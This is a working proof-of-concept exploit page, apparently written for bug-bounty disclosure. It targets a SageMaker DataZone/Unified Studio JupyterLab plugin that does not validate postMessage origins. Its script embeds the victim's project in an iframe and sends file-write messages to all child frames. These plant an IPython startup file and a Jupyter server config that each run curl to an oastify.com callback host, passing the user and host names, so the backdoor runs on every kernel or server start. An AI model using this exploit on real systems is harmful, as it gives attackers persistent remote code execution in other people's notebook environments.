    .ok { color: #2e7d32; } .err { color: #c62828; } .warn { color: #e65100; }

<body>
  <h1>PoC: postMessage → RCE SageMaker DataZone/Unified Studio</h1>
  <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>

  <label>Target DataZone/Unified Studio Project URL:</label>
  <input id="url" value="https://example.com/projects/4cy7e339sr8omh/code" />
  <label>Wait for Studio + iframe to load (ms):</label>
  <input id="wait" value="12000" />

  <button id="launchBtn">Click Anywhere To Launch Exploit</button>
  <div id="status"></div>
  <iframe id="target" style="width:100%;height:300px;margin-top:15px;border:1px solid #90b0e0;display:none;"></iframe>

<script>
var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
var launched = false;
document.addEventListener('click', function(e) {
  if (e.target.tagName === 'INPUT') return;
  if (!launched) { launched = true; exploit(); }
});

function status(msg, cls) {
  document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
}

function sendPayload(target, path, content, label) {
  target.postMessage({
    type: 'sagemaker:nbevent:OpenOrCreateFile',
    payload: { type: 'file', path: path, content: content, format: 'text' }
  }, '*');
  status(label, 'ok');
}

function exploit() {
  var url = document.getElementById('url').value.trim();
  var wait = parseInt(document.getElementById('wait').value) || 12000;

  // Embed target as iframe — avoids popup blockers and close issues
  var iframe = document.getElementById('target');
  iframe.src = url;
  iframe.style.display = 'block';
  status('Loading target in iframe. Waiting ' + wait + 'ms...', 'warn');

  setTimeout(function() {
    var outer = iframe.contentWindow;
    if (!outer) { status('Cannot access iframe contentWindow.', 'err'); return; }

    // The DataZone page itself has a nested iframe (sagemaker-ui-code-ide)
    // containing JupyterLab. Try nested frame first, fall back to outer.
    var target = outer[0] || outer;
    var via = outer[0] ? 'nested iframe (outer[0])' : 'outer iframe directly';
    status('Targeting: ' + via + '. Sending payloads...', 'ok');

    // Also spray all child frames in case the index varies
    var frames = [target];
    try { for (var i = 0; i < outer.length; i++) frames.push(outer[i]); } catch(e) {}

    frames.forEach(function(f) {
      // Attack 1: IPython startup — executes on every kernel start
      sendPayload(f,
        '.ipython/profile_default/startup/00-backdoor.py',
        'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")',
        '[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py'
      );
    });
    status('       → Executes every time a Jupyter kernel starts', 'ok');

    setTimeout(function() {
      frames.forEach(function(f) {
        // Attack 2: Jupyter server config — executes on server restart
        sendPayload(f,
          '.jupyter/jupyter_server_config.py',
          'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")',
          '[2/2] Wrote .jupyter/jupyter_server_config.py'
        );
      });
      status('       → Executes on Jupyter server restart', 'ok');
      status('Check Burp Collaborator for callbacks.', 'warn');
    }, 500);
  }, wait);
}
</script>
